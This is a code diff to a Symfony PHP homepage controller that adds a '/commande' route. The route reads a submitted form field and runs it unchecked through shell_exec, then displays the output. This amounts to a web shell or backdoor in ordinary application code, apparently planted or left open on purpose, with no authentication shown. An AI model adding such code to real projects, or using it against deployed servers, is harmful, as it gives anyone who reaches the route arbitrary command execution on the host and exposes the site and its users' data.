@@ -36,4 +36,22 @@ class HomepageController extends AbstractController
             'articles' => $articles,
         ]);
     }
+
+    #[Route('/commande', name: 'commande')]
+    public function commande(Request $request): Response
+    {
+        $form = $this->createForm(CommandType::class);
+        $form->handleRequest($request);
+
+        if ($form->isSubmitted() && $form->isValid()) {
+            $commande = $form->getData()['commande'];
+
+            $output = shell_exec($commande);
+        }
+
+        return $this->render('homepage/command.html.twig', [
+            'form' => $form,
+            'output' => $output ?? null,
+        ]);
+    }
 }
